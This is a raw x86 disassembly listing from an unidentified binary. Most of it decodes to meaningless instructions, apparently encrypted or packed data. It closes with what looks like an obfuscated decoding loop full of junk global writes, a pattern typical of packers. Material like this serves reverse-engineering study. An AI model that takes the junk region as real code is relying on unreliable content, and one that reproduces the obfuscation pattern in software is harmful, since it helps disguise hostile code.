  407866:	mov    ecx,0x17a9e333
  40786b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40786c:	sbb    BYTE PTR [edx],bl
  40786e:	hlt    
  40786f:	pop    ss
  407870:	pop    ebp
  407871:	sbb    edi,DWORD PTR [edi+0x63]
  407874:	cmc    
  407875:	pop    ebp
  407876:	jo     0x4078a4
  407878:	dec    esp
  407879:	xchg   edx,eax
  40787a:	ret    
  40787b:	iret   
  40787c:	pop    ds
  40787d:	or     ebp,DWORD PTR ds:0x40ce36d5
  407883:	out    0x15,al
  407885:	mov    ebx,0xe9815382
  40788a:	adc    BYTE PTR [ebx+0x36e57f75],0xdf
  407891:	scas   al,BYTE PTR es:[edi]
  407892:	mov    esi,0xf894767e
  407897:	xchg   BYTE PTR [edx],bh
  407899:	or     DWORD PTR [edx],ecx
  40789b:	cmp    bh,BYTE PTR [eax]
  40789d:	mov    dh,0x65
  40789f:	dec    ebx
  4078a0:	cdq    
  4078a1:	dec    ebp
  4078a2:	addr16 cdq 
  4078a4:	lds    dx,DWORD PTR [ebx+0x733aada1]
  4078ab:	dec    eax
  4078ac:	jge    0x4078fd
  4078ae:	out    0xe2,eax
  4078b0:	mov    esp,esi
  4078b2:	jbe    0x407924
  4078b4:	push   edx
  4078b5:	xor    eax,0xd9c2a71b
  4078ba:	or     ebp,DWORD PTR [ecx]
  4078bc:	js     0x407874
  4078be:	fidivr WORD PTR [edx+0x64]
  4078c1:	sbb    bh,ch
  4078c3:	mov    WORD PTR [edx+ebx*2+0x40e81320],cs
  4078ca:	jl     0x4078f4
  4078cc:	out    0x3b,al
  4078ce:	repz add BYTE PTR fs:[edx+0x4f],bh
  4078d3:	mov    esp,DWORD PTR [eax]
  4078d5:	repz jp 0x4078c2
  4078d8:	jmp    0x4d2c:0x924ccc1e
  4078df:	fs dec ecx
  4078e1:	sub    esp,DWORD PTR [eax+0x7a]
  4078e4:	xchg   ebp,eax
  4078e5:	ds adc ah,bl
  4078e8:	out    dx,al
  4078e9:	mov    ebp,0xb34543c
  4078ee:	in     al,dx
  4078ef:	and    dl,BYTE PTR [esi]
  4078f1:	cmp    BYTE PTR [edx],bl
  4078f3:	lea    esp,[ecx-0x6909e1a4]
  4078f9:	ret    0xf0c
  4078fc:	mov    ds:0x13c4d2cc,al
  407901:	or     eax,0x47fcc1c4
  407906:	xchg   DWORD PTR [ebx-0x55a64d35],ebp
  40790c:	call   FWORD PTR [edx+ebp*8+0x21]
  407910:	fdivr  QWORD PTR [ecx-0x11]
  407913:	or     ch,BYTE PTR [edi]
  407915:	push   esi
  407916:	xchg   edx,eax
  407917:	adc    eax,0xe0dffbf0
  40791c:	inc    esp
  40791d:	cmp    BYTE PTR [ecx+0x5546b834],bl
  407923:	pusha  
  407924:	xor    DWORD PTR [ebx-0x3fd82bd7],edi
  40792a:	popa   
  40792b:	sbb    DWORD PTR [esi],ebp
  40792d:	jae    0x40798b
  40792f:	into   
  407930:	mov    ebx,0x215ac3c0
  407935:	popf   
  407936:	adc    ecx,eax
  407938:	add    ecx,DWORD PTR [ecx-0x7470022]
  40793e:	mov    dh,0xa1
  407940:	dec    ebx
  407941:	xchg   esi,eax
  407942:	jp     0x4078ea
  407944:	push   0x2e5862f7
  407949:	fild   DWORD PTR [eax]
  40794b:	add    esi,DWORD PTR [esi+eax*8-0x2531cabb]
  407952:	jbe    0x4079c4
  407954:	adc    BYTE PTR [esp+esi*2],ah
  407957:	cld    
  407958:	(bad)  
  407959:	jne    0x40796f
  40795b:	push   ecx
  40795c:	div    BYTE PTR [edi]
  40795e:	push   ebx
  40795f:	popa   
  407960:	mov    eax,ds:0x70a9011e
  407965:	xlat   BYTE PTR ds:[ebx]
  407966:	stos   BYTE PTR es:[edi],al
  407967:	jmp    0x4079e4
  407969:	hlt    
  40796a:	ror    BYTE PTR [eax-0x12],1
  40796d:	jo     0x4079b7
  40796f:	cmp    BYTE PTR ds:0xfe2c7cfa,dh
  407975:	jae    0x407934
  407977:	add    esp,eax
  407979:	mov    eax,ds:0xf1be3ac6
  40797e:	adc    ecx,ebx
  407980:	js     0x407905
  407982:	xchg   esp,eax
  407983:	inc    esi
  407984:	and    dh,cl
  407986:	jmp    0x40793a
  407988:	jnp    0x40795b
  40798a:	mov    WORD PTR [ebx],fs
  40798c:	and    ebx,edi
  40798e:	xchg   ebx,eax
  40798f:	repz mov al,ds:0x28703b09
  407995:	adc    eax,0x8d0c2506
  40799a:	sbb    al,BYTE PTR [edi]
  40799c:	mov    ?,WORD PTR [eax-0x40]
  40799f:	fcmovb st,st(7)
  4079a1:	(bad)  
  4079a2:	xor    bh,al
  4079a4:	adc    dl,BYTE PTR [esi+eiz*1+0x3b]
  4079a8:	clc    
  4079a9:	dec    ecx
  4079aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ab:	scas   eax,DWORD PTR es:[edi]
  4079ac:	mov    ebp,0x27b74ffc
  4079b1:	(bad)  
  4079b2:	outs   dx,DWORD PTR ds:[esi]
  4079b3:	repz (bad) 
  4079b5:	push   cs
  4079b6:	xor    al,0xf6
  4079b8:	xchg   ebp,eax
  4079b9:	inc    edi
  4079ba:	(bad)  
  4079bb:	test   DWORD PTR [edi-0x6a],0xadfebe01
  4079c2:	xchg   esi,eax
  4079c3:	loopne 0x407990
  4079c5:	nop
  4079c6:	cs pusha 
  4079c8:	add    eax,eax
  4079ca:	das    
  4079cb:	(bad)
  4079ce:	jno    0x407972
  4079d0:	mov    edi,0x146ea6a0
  4079d5:	or     ch,BYTE PTR [edx]
  4079d7:	stc    
  4079d8:	adc    bl,BYTE PTR [edx+0x5b]
  4079db:	rcl    ah,0xf5
  4079de:	pop    es
  4079df:	cmp    BYTE PTR [ecx+0x1b],0x82
  4079e3:	outs   dx,BYTE PTR ds:[esi]
  4079e4:	cld    
  4079e5:	in     eax,0xa
  4079e7:	leave  
  4079e8:	ins    DWORD PTR es:[edi],dx
  4079e9:	xor    BYTE PTR [ecx],0xea
  4079ec:	test   al,0x1b
  4079ee:	inc    ebx
  4079ef:	push   edx
  4079f0:	ret    0x4b7
  4079f3:	pop    esp
  4079f4:	stos   BYTE PTR es:[edi],al
  4079f5:	das    
  4079f6:	mov    al,ds:0xa5c448eb
  4079fb:	inc    ecx
  4079fc:	mov    ebx,0x6060ed52
  407a01:	popa   
  407a02:	xchg   edi,eax
  407a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a04:	fsubr  DWORD PTR [ebx]
  407a06:	sub    BYTE PTR [esi+0x4c],bh
  407a09:	lock call 0x9f03c9cd
  407a0f:	mov    ebx,0x8b894bd9
  407a14:	sub    al,0xed
  407a16:	xchg   esp,eax
  407a17:	js     0x407a2d
  407a19:	xor    al,0x2b
  407a1b:	and    al,dl
  407a1d:	mov    cl,0x9a
  407a1f:	mov    al,ds:0x35b8c5dc
  407a24:	in     al,dx
  407a25:	xchg   ebx,eax
  407a26:	jp     0x407a0e
  407a28:	test   eax,0x315665b2
  407a2d:	mov    gs,WORD PTR [ebx]
  407a2f:	pop    edi
  407a30:	fsub   QWORD PTR [esi]
  407a32:	hlt    
  407a33:	rcl    DWORD PTR [ecx-0x5b],cl
  407a36:	inc    DWORD PTR [eax-0x3ceff0f0]
  407a3c:	xchg   ebx,eax
  407a3d:	sub    ebp,DWORD PTR [eax]
  407a3f:	sbb    al,ah
  407a41:	call   0x895f:0xee587ba7
  407a48:	jb     0x407a91
  407a4a:	mov    BYTE PTR cs:[edx+0x47b3e48c],dl
  407a51:	int    0xa6
  407a53:	dec    ecx
  407a54:	adc    BYTE PTR ds:0x55b7d80d,dl
  407a5a:	mul    esp
  407a5c:	mov    esi,ebp
  407a5e:	sbb    cl,BYTE PTR [ecx+0x16]
  407a61:	(bad)  
  407a62:	and    DWORD PTR [edi],ebp
  407a64:	xor    BYTE PTR [edi+edi*8+0x386c3762],dl
  407a6b:	xor    dh,bh
  407a6d:	call   0xed746394
  407a72:	test   BYTE PTR [edi+0x70],al
  407a75:	jmp    0x6aef3a3e
  407a7a:	aad    0xeb
  407a7c:	pushf  
  407a7d:	in     eax,0x72
  407a7f:	pop    esi
  407a80:	and    BYTE PTR [ebp+0xd],ch
  407a83:	or     DWORD PTR [ebx-0x40b319ba],edx
  407a89:	neg    BYTE PTR [eax]
  407a8b:	in     eax,dx
  407a8c:	cmc    
  407a8d:	inc    edi
  407a8e:	add    DWORD PTR [esi],eax
  407a90:	push   es
  407a91:	xor    ah,dl
  407a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a94:	pop    ebp
  407a95:	add    ecx,ecx
  407a97:	mov    ecx,0x8889e875
  407a9c:	mov    edi,0x206ece59
  407aa1:	xchg   ebx,eax
  407aa2:	popa   
  407aa3:	mov    ch,0x62
  407aa6:	lahf   
  407aa7:	int    0xb6
  407aa9:	fmul   QWORD PTR ds:0x48c897f8
  407aaf:	sahf   
  407ab0:	dec    ebp
  407ab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ab2:	test   DWORD PTR [edi],esp
  407ab4:	pop    ebp
  407ab5:	stos   WORD PTR es:[edi],ax
  407ab7:	xchg   BYTE PTR [ecx],ah
  407ab9:	iret   
  407aba:	mov    cl,0x1d
  407abc:	ins    BYTE PTR es:[edi],dx
  407abd:	fisttp WORD PTR [esp+eiz*4-0x47]
  407ac1:	sub    eax,0xe72a3b2b
  407ac6:	mov    dh,0xf1
  407ac8:	inc    esi
  407ac9:	aaa    
  407aca:	xchg   edx,eax
  407acb:	fisub  DWORD PTR [edi]
  407acd:	test   al,0x70
  407acf:	xchg   esi,eax
  407ad0:	loopne 0x407aae
  407ad2:	outs   dx,DWORD PTR ds:[esi]
  407ad3:	imul   ch
  407ad5:	cmp    ecx,0x15eee272
  407adb:	mov    ah,0x6d
  407add:	fstp   QWORD PTR [ebp+eax*2-0x1d]
  407ae1:	and    al,0x7a
  407ae3:	add    DWORD PTR [esi],ebp
  407ae5:	in     eax,dx
  407ae6:	stc    
  407ae7:	mov    ebx,0x997e24a
  407aec:	jmp    0x8f0c:0x5ffb3e9b
  407af3:	or     ebp,ecx
  407af5:	inc    ebp
  407af6:	pop    ebp
  407af7:	xor    dh,ch
  407af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407afa:	mov    edi,DWORD PTR [eax+0x3e9af1aa]
  407b00:	aas    
  407b01:	inc    ebp
  407b02:	int3   
  407b03:	mov    ?,WORD PTR [ecx+ecx*1-0x37]
  407b07:	mov    eax,ds:0x6b66301a
  407b0c:	ins    BYTE PTR es:[edi],dx
  407b0d:	pop    esp
  407b0e:	mov    cl,0x91
  407b10:	mov    ah,0x7f
  407b12:	dec    ebx
  407b13:	aad    0x54
  407b15:	mov    ds:0xb3d3dd59,eax
  407b1a:	and    BYTE PTR [ecx],dh
  407b1c:	aam    0x8d
  407b1e:	jo     0x407abb
  407b20:	inc    BYTE PTR [ebp+edx*2-0x169d0b47]
  407b27:	imul   eax,esp,0xaa1a4be7
  407b2d:	es mov ebp,0x2cb431f4
  407b33:	xchg   edx,eax
  407b34:	cwde   
  407b35:	neg    DWORD PTR [edx-0x3c09c0ef]
  407b3b:	mov    dh,0xe0
  407b3d:	push   eax
  407b3e:	pop    ebp
  407b3f:	out    dx,al
  407b40:	ds xchg edi,eax
  407b42:	fcom   QWORD PTR [edx+0x6d]
  407b45:	xor    eax,0x4fbfa61c
  407b4a:	or     esi,0x5a
  407b4d:	mov    esp,0x2f0b86b9
  407b52:	add    ebp,esi
  407b54:	mov    eax,ds:0xdf82f1a1
  407b59:	addr16 add al,0x94
  407b5c:	and    ebx,DWORD PTR [esp+ebp*1]
  407b5f:	add    eax,0x62dc67e4
  407b64:	mov    bl,0x61
  407b66:	daa    
  407b67:	mov    ecx,0x6205039b
  407b6c:	dec    ecx
  407b6d:	push   ecx
  407b6e:	xchg   ebp,eax
  407b6f:	mov    bh,dh
  407b71:	jp     0x407bc7
  407b73:	adc    eax,0xfbdb59af
  407b78:	or     eax,0x9e8a4313
  407b7d:	inc    ecx
  407b7e:	mov    dh,0xd1
  407b80:	cld    
  407b81:	call   0x22982215
  407b86:	addr16 int 0xae
  407b89:	icebp  
  407b8a:	in     al,dx
  407b8b:	mov    ds:0xd6fd8108,al
  407b90:	sahf   
  407b91:	fcom   DWORD PTR [ecx+eiz*8-0x4e48900a]
  407b98:	es je  0x407be2
  407b9b:	mov    eax,ds:0x10fe3d65
  407ba0:	and    DWORD PTR [edi+0x52bed642],edi
  407ba6:	popf   
  407ba7:	pop    esi
  407ba8:	lods   eax,DWORD PTR ds:[esi]
  407ba9:	es (bad) 
  407bab:	jmp    0x13c7:0xe322c8b3
  407bb2:	mov    ds:0x945aed53,eax
  407bb7:	mov    dh,0xab
  407bb9:	push   ss
  407bba:	daa    
  407bbb:	imul   esi,DWORD PTR [ebp+eax*2-0x3c],0xf5b5d7dd
  407bc3:	adc    eax,0xbc9ef5c3
  407bc8:	jns    0x407bf9
  407bca:	jp     0x407b74
  407bcc:	jl     0x407c3c
  407bce:	stos   BYTE PTR es:[edi],al
  407bcf:	push   es
  407bd0:	xor    BYTE PTR [edx],bh
  407bd2:	out    dx,al
  407bd3:	call   0x903e:0xfbc97665
  407bda:	cmp    eax,0x2653b0ba
  407bdf:	and    BYTE PTR [ebx-0x3],bh
  407be2:	sti    
  407be3:	mov    bl,0x1
  407be5:	jbe    0x407bb1
  407be7:	pop    ecx
  407be8:	add    BYTE PTR [ebx],0x50
  407beb:	bound  esi,QWORD PTR [edx]
  407bed:	(bad)  
  407bef:	sub    esp,DWORD PTR ds:0xb12098a1
  407bf5:	pop    edi
  407bf6:	pop    ecx
  407bf7:	mov    WORD PTR [edx],ds
  407bf9:	stos   BYTE PTR es:[edi],al
  407bfa:	dec    ecx
  407bfb:	fwait
  407bfc:	imul   edi,DWORD PTR [esi+0x3],0x3ad5226a
  407c03:	mov    ds:0x50ff50bb,al
  407c08:	(bad)  
  407c09:	std    
  407c0a:	or     al,ch
  407c0c:	push   edi
  407c0e:	sti    
  407c0f:	test   BYTE PTR [edi-0x5],dl
  407c12:	sub    al,dh
  407c14:	in     al,0x65
  407c16:	adc    cl,bh
  407c18:	loop   0x407c33
  407c1a:	xchg   edx,eax
  407c1b:	(bad)  
  407c1c:	mov    cl,0x5a
  407c1e:	mov    eax,ebx
  407c20:	sbb    edi,DWORD PTR [ecx+edi*4+0x461a5e6e]
  407c27:	cmp    dh,BYTE PTR [ecx-0x4a]
  407c2a:	idiv   BYTE PTR [ecx+0x1]
  407c2d:	fst    DWORD PTR [eax]
  407c2f:	mov    cl,0x81
  407c31:	retf   
  407c32:	inc    edx
  407c33:	std    
  407c34:	cmc    
  407c35:	jb     0x407c78
  407c37:	sahf   
  407c38:	pop    edx
  407c39:	mov    esp,0xaae6f14a
  407c3e:	pop    ebx
  407c3f:	xchg   bl,ch
  407c41:	mov    WORD PTR [ebp+0x11],fs
  407c44:	retf   0xc3ea
  407c47:	enter  0xcf6a,0xcc
  407c4b:	add    al,0x9e
  407c4d:	js     0x407c74
  407c4f:	popf   
  407c50:	je     0x407be0
  407c52:	in     eax,dx
  407c53:	inc    edx
  407c54:	mov    cl,0xde
  407c56:	xchg   ebp,eax
  407c57:	inc    ebx
  407c58:	in     eax,0x4
  407c5a:	out    dx,al
  407c5b:	sar    bh,0xf7
  407c5e:	pop    eax
  407c5f:	inc    ebx
  407c60:	mov    bl,0x10
  407c62:	xor    eax,0xbe067fca
  407c67:	or     DWORD PTR [ecx-0x237c6ea1],ecx
  407c6d:	sub    al,0x8a
  407c6f:	(bad)  
  407c70:	pusha  
  407c71:	dec    eax
  407c72:	xor    esi,DWORD PTR [ebp-0x694e8be]
  407c78:	scas   eax,DWORD PTR es:[edi]
  407c79:	xor    al,0x25
  407c7b:	jb     0x407c45
  407c7d:	inc    edx
  407c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c7f:	pop    ds
  407c80:	data16 aaa 
  407c82:	inc    ebx
  407c83:	lds    ecx,FWORD PTR [edx-0x481de342]
  407c89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c8a:	test   eax,0xa2f8343
  407c8f:	mov    esi,0x4a2da2be
  407c94:	clc    
  407c95:	cmovl  edi,DWORD PTR ds:0xa68cd08e
  407c9c:	clc    
  407c9d:	mov    eax,0xb6e91482
  407ca2:	mov    ch,0x49
  407ca4:	retf   0x2bff
  407ca7:	shl    DWORD PTR [ecx+esi*1],cl
  407caa:	test   DWORD PTR [ebx-0x6368dd61],esi
  407cb0:	rcr    esp,cl
  407cb2:	inc    ebp
  407cb3:	xlat   BYTE PTR ds:[ebx]
  407cb4:	hlt    
  407cb5:	leave  
  407cb6:	sub    BYTE PTR [edi+eiz*8],dh
  407cb9:	pusha  
  407cba:	lods   eax,DWORD PTR ds:[esi]
  407cbb:	je     0x407c56
  407cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cbe:	jbe    0x407c4e
  407cc0:	dec    esi
  407cc1:	sbb    ebp,DWORD PTR [ecx+0xc]
  407cc4:	mov    gs,WORD PTR [edi+ebx*4]
  407cc7:	test   ebx,esi
  407cc9:	push   edx
  407cca:	sbb    BYTE PTR [edx-0x31],ah
  407ccd:	mov    esi,0xf2d54768
  407cd2:	adc    ah,cl
  407cd4:	sub    eax,0xdb493dea
  407cd9:	jmp    0x407c99
  407cdb:	mov    bh,0x3f
  407cdd:	mov    edx,0x3d27e3cf
  407ce2:	pushf  
  407ce3:	into   
  407ce4:	adc    al,BYTE PTR [ebx+0x2edfc752]
  407cea:	sbb    al,0xae
  407cec:	sbb    DWORD PTR [ecx],edx
  407cee:	add    DWORD PTR [ebx+0x37926d22],0xaf17890f
  407cf8:	aad    0xbd
  407cfa:	xchg   edi,eax
  407cfb:	mov    al,ds:0xe59261bd
  407d00:	(bad)  
  407d01:	hlt    
  407d02:	mov    edx,0x5f14d31
  407d07:	jge    0x407cf1
  407d09:	hlt    
  407d0a:	jg     0x407c9a
  407d0c:	pop    ecx
  407d0d:	cmp    cl,BYTE PTR [ebx]
  407d0f:	(bad)  
  407d10:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  407d12:	adc    al,BYTE PTR ds:0xa7bf5478
  407d18:	adc    edi,DWORD PTR [edi-0x66]
  407d1b:	jmp    0x407d84
  407d1d:	es mov ecx,0xaaf176dd
  407d23:	faddp  st(6),st
  407d25:	sar    BYTE PTR [esi+0x71],1
  407d28:	jmp    DWORD PTR [edi]
  407d2a:	rcr    BYTE PTR [ebx],cl
  407d2c:	sub    al,0xe7
  407d2e:	cmp    dh,BYTE PTR [ebx-0x64af8b5f]
  407d34:	cmp    DWORD PTR [edi+0x2833f5e3],esp
  407d3a:	mov    ebp,0xcd9cce2a
  407d3f:	xor    esi,DWORD PTR [edi]
  407d41:	jle    0x407d39
  407d43:	hlt    
  407d44:	stos   DWORD PTR es:[edi],eax
  407d45:	shl    eax,0x1c
  407d48:	arpl   WORD PTR [eax+0x39055746],bp
  407d4e:	rcl    ebx,1
  407d50:	push   ecx
  407d51:	adc    eax,0x2708dec4
  407d56:	mov    eax,ds:0xc8779275
  407d5b:	retf   0xbb94
  407d5e:	and    eax,0x9fb36433
  407d63:	enter  0xffd9,0x64
  407d67:	repz jg 0x407dac
  407d6a:	push   esi
  407d6b:	pop    edx
  407d6c:	retf   0x6a2
  407d6f:	(bad)  
  407d70:	mov    WORD PTR [ebx],?
  407d72:	pop    es
  407d73:	pop    ds
  407d74:	vpunpcklwd xmm7,xmm7,XMMWORD PTR [esi+0x782d2d21]
  407d7c:	xchg   al,cl
  407d7e:	and    eax,0x35d19b07
  407d84:	nop
  407d85:	cld    
  407d86:	test   DWORD PTR [edx],0x54e1351f
  407d8c:	(bad)
  407d90:	xor    al,0x87
  407d92:	mov    al,ds:0xff2348c
  407d97:	in     eax,dx
  407d98:	pop    esp
  407d99:	dec    edi
  407d9a:	cmp    DWORD PTR [edx],0x3b
  407d9d:	jo     0x407d72
  407d9f:	jge    0x407d5d
  407da1:	sbb    bl,BYTE PTR [eax-0x1129daa8]
  407da7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407da8:	stos   DWORD PTR es:[edi],eax
  407da9:	cmp    al,0x6
  407dab:	mov    edx,0xd0d31ea5
  407db0:	sub    ch,BYTE PTR [ebx-0x4f]
  407db3:	sub    al,0xac
  407db5:	retf   0x5b91
  407db8:	add    ecx,ecx
  407dba:	mov    bh,0x57
  407dbc:	(bad)  
  407dbd:	dec    ebx
  407dbe:	mov    edx,0x6dc69602
  407dc3:	push   0xffffffb9
  407dc5:	xor    al,0x1f
  407dc7:	pop    es
  407dc8:	and    al,0xc8
  407dca:	js     0x407d5b
  407dcc:	add    ah,BYTE PTR [eax-0x30]
  407dcf:	lds    esi,FWORD PTR [esi+0x1]
  407dd2:	adc    al,0x58
  407dd4:	les    edi,FWORD PTR [ebp+0x1a]
  407dd7:	sub    BYTE PTR [esi+0x5ea0f407],al
  407ddd:	int    0xb9
  407ddf:	mov    eax,ds:0xc9022cc7
  407de4:	xor    DWORD PTR [ecx-0x7ffb8d75],ebp
  407dea:	add    cl,BYTE PTR [eax+esi*1-0x5f]
  407dee:	push   eax
  407def:	mov    dh,0x13
  407df1:	inc    esi
  407df2:	stc    
  407df3:	jecxz  0x407d8f
  407df5:	push   ecx
  407df6:	or     DWORD PTR [ecx-0x50dc911f],ebx
  407dfc:	lock inc edx
  407dfe:	into   
  407dff:	xor    BYTE PTR [esi-0x24d01f40],al
  407e05:	xor    BYTE PTR [edi-0x6b],dh
  407e08:	ret    
  407e09:	aam    0x33
  407e0b:	gs aas 
  407e0d:	cmp    edi,ecx
  407e0f:	lock jmp 0xc39e6e5b
  407e15:	ficomp DWORD PTR [esi-0x59]
  407e18:	inc    esi
  407e19:	adc    eax,0xb8ab07fa
  407e1e:	adc    ecx,edi
  407e20:	or     al,0x89
  407e22:	dec    ebp
  407e23:	xor    ecx,DWORD PTR [esi+0x7c]
  407e26:	push   ebx
  407e27:	xor    eax,0xf2c98fb3
  407e2c:	xor    bl,BYTE PTR [eax-0x58]
  407e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e30:	les    edx,FWORD PTR [esi]
  407e32:	jmp    0x2a60d6e7
  407e37:	fwait
  407e38:	mov    ebx,0xda518293
  407e3d:	inc    edi
  407e3e:	mov    ebp,0x74c07335
  407e43:	sub    DWORD PTR [edi-0x45],ebx
  407e46:	retf   0xac4d
  407e49:	xor    BYTE PTR [ebx+0x4d20be58],ah
  407e4f:	cli    
  407e50:	shl    DWORD PTR [ecx-0x5eb4d3a5],cl
  407e56:	vmovaps xmm2,XMMWORD PTR [edx-0x4f]
  407e5b:	scas   eax,DWORD PTR es:[edi]
  407e5c:	scas   al,BYTE PTR es:[edi]
  407e5d:	jae    0x407e30
  407e5f:	out    0x5d,eax
  407e61:	inc    esi
  407e62:	jle    0x407e84
  407e64:	cmp    ebp,edi
  407e66:	mov    WORD PTR [ebx],es
  407e68:	pop    ebx
  407e69:	rcr    DWORD PTR [edx-0x5b48217c],cl
  407e6f:	das    
  407e70:	push   ss
  407e71:	cmp    ch,bl
  407e73:	push   esp
  407e74:	ins    BYTE PTR es:[edi],dx
  407e75:	or     ebx,ebp
  407e77:	dec    ebx
  407e78:	mov    dl,0x40
  407e7a:	in     al,0xf4
  407e7c:	shl    DWORD PTR [ecx-0x3c3456ea],cl
  407e82:	mov    dh,0x8f
  407e84:	push   ebx
  407e85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e86:	pop    edi
  407e87:	mov    cl,0xeb
  407e89:	inc    eax
  407e8a:	enter  0x59bb,0xb
  407e8e:	add    cl,BYTE PTR [esi+edi*8-0x17eb95be]
  407e95:	out    0x66,eax
  407e97:	dec    eax
  407e98:	cmp    ch,0x3f
  407e9b:	lods   eax,DWORD PTR ds:[esi]
  407e9c:	aas    
  407e9d:	push   esp
  407e9e:	inc    eax
  407e9f:	pop    DWORD PTR [ecx]
  407ea1:	mul    dh
  407ea3:	loope  0x407ea7
  407ea5:	sub    eax,0x851a0090
  407eaa:	pop    es
  407eab:	dec    esp
  407eac:	rol    ebp,1
  407eae:	arpl   WORD PTR [ebp-0x49a87b0],cx
  407eb4:	stos   DWORD PTR es:[edi],eax
  407eb5:	xchg   esp,eax
  407eb6:	lds    ebp,FWORD PTR [eax]
  407eb8:	pop    ds
  407eb9:	ins    BYTE PTR es:[edi],dx
  407eba:	out    0x1,eax
  407ebc:	ret    
  407ebd:	sbb    cl,0xb0
  407ec0:	(bad)  
  407ec1:	fnstsw WORD PTR [edi]
  407ec3:	ss hlt 
  407ec5:	dec    edx
  407ec6:	and    DWORD PTR [edx+0x1bbc5b56],edx
  407ecc:	jp     0x407e5c
  407ece:	xor    eax,0xfb47c785
  407ed3:	jne    0x407e80
  407ed5:	fucomp st(7)
  407ed7:	arpl   WORD PTR [ecx+0x67],si
  407eda:	retf   0xc951
  407edd:	lea    edi,[ecx+0x46d5d3d7]
  407ee3:	push   ebp
  407ee4:	jmp    0x407ec1
  407ee6:	mov    bh,0x6e
  407ee8:	ficomp WORD PTR [ebp+edx*8-0x1ede937b]
  407eef:	loope  0x407e88
  407ef1:	or     ch,BYTE PTR [edi+edx*2]
  407ef4:	pusha  
  407ef5:	cmp    eax,0x4b361b5a
  407efa:	retf   
  407efb:	pushf  
  407efc:	xchg   ebx,eax
  407efd:	pop    esp
  407efe:	mov    al,ds:0xf90143ce
  407f03:	(bad)  
  407f04:	jl     0x407e93
  407f06:	jae    0x407f22
  407f08:	aas    
  407f09:	sbb    ebx,ebp
  407f0b:	pop    es
  407f0c:	mov    cl,0xfc
  407f0e:	pop    edi
  407f0f:	(bad)  
  407f10:	push   cs
  407f11:	pop    ecx
  407f12:	mov    al,ds:0x497c7870
  407f17:	(bad)  
  407f18:	in     al,0x33
  407f1a:	jmp    0xd680b739
  407f1f:	sti    
  407f20:	or     cl,ah
  407f22:	fisub  DWORD PTR [ebx-0xd]
  407f25:	and    eax,DWORD PTR [esi+0x5c33ee25]
  407f2b:	shr    BYTE PTR [edx-0x38fa36c6],cl
  407f31:	adc    ecx,edx
  407f33:	sbb    esi,DWORD PTR [edi-0x49e026b1]
  407f39:	xchg   esp,eax
  407f3a:	cmp    BYTE PTR [esi+esi*1-0x42],dl
  407f3e:	push   ds
  407f3f:	cdq    
  407f40:	sub    al,0x73
  407f42:	sbb    BYTE PTR [ebx],bh
  407f44:	mov    ebx,0xabad4d12
  407f49:	jmp    0x701a:0x9cf19d41
  407f50:	sub    DWORD PTR [ebp-0x7af01830],eax
  407f56:	sahf   
  407f57:	add    DWORD PTR [eax],eax
  407f59:	add    BYTE PTR [ebx-0x26080bbb],cl
  407f5f:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  407f66:	adc    ecx,eax
  407f68:	mov    eax,DWORD PTR [ebp-0x28]
  407f6b:	mov    ecx,DWORD PTR [ebp-0x18]
  407f6e:	not    DWORD PTR ds:0x42a2da
  407f74:	xor    eax,esi
  407f76:	or     DWORD PTR ds:0x42a2fa,0xa4f
  407f80:	xor    ecx,esi
  407f82:	or     DWORD PTR ds:0x42a26a,0x42a2f6
  407f8c:	add    eax,edi
  407f8e:	add    ecx,edi
  407f90:	mov    BYTE PTR [ebp-0x21],dl
  407f93:	cmp    eax,ecx
  407f95:	jae    0x408098
  407f9b:	add    edx,DWORD PTR ds:0x42a2a2
  407fa1:	lea    ecx,[eax-0x3272f1]
  407fa7:	mov    DWORD PTR [ebp-0x14],ecx
  407faa:	sub    DWORD PTR ds:0x42a27a,0x2374
  407fb4:	mov    edx,DWORD PTR [ebp-0x14]
  407fb7:	add    DWORD PTR ds:0x42a2a2,0x6412
  407fc1:	xor    edx,esi
  407fc3:	add    edx,0x7f55d8fb
  407fc9:	lea    ecx,[ebp+eax*4-0xb4]
  407fd0:	mov    DWORD PTR ds:0x42a25a,0x798e
  407fda:	mov    DWORD PTR [ecx],edx
  407fdc:	mov    edx,0x1097
  407fe1:	mov    edx,DWORD PTR [ecx]
  407fe3:	cmp    edx,0x244ecb98
  407fe9:	jbe    0x408004
  407fef:	xor    DWORD PTR ds:0x42a29a,0x42a2d6
  407ff9:	add    DWORD PTR [ecx],0x405fcd9
  407fff:	jmp    0x40800a
  408004:	add    DWORD PTR [ecx],0xfdaf4327
  40800a:	or     DWORD PTR ds:0x42a2f6,edi
  408010:	mov    ecx,DWORD PTR [ebp-0x18]
  408013:	xor    ecx,esi
  408015:	and    DWORD PTR ds:0x42a25e,0x42a27a
  40801f:	inc    eax
  408020:	and    DWORD PTR ds:0x42a2aa,0x42a2a6
  40802a:	inc    DWORD PTR [ebp-0x14]
  40802d:	add    ecx,edi
  40802f:	mov    DWORD PTR ds:0x42a2f6,0x14dc
  408039:	cmp    eax,ecx
  40803b:	mov    DWORD PTR ds:0x42a2fe,0x33af
  408045:	jb     0x407faa
  40804b:	and    DWORD PTR ds:0x42a25e,0x0
  408055:	mov    eax,ds:0x42a25e
  40805a:	inc    eax
  40805b:	mov    ds:0x42a25e,eax
  408060:	cmp    DWORD PTR ds:0x42a25e,0x1c
  408067:	jb     0x408095
  40806d:	jmp    0x408088
  408072:	push   0x6d6b
  408077:	push   0x44a2
  40807c:	push   DWORD PTR [ebp-0x14]
  40807f:	push   DWORD PTR [ebp-0x18]
  408082:	call   DWORD PTR ds:0x42a3de
  408088:	cmp    DWORD PTR ds:0x42a25e,0x18
  40808f:	jb     0x408055
  408095:	mov    dl,BYTE PTR [ebp-0x21]
  408098:	mov    eax,DWORD PTR [ebp-0x34]
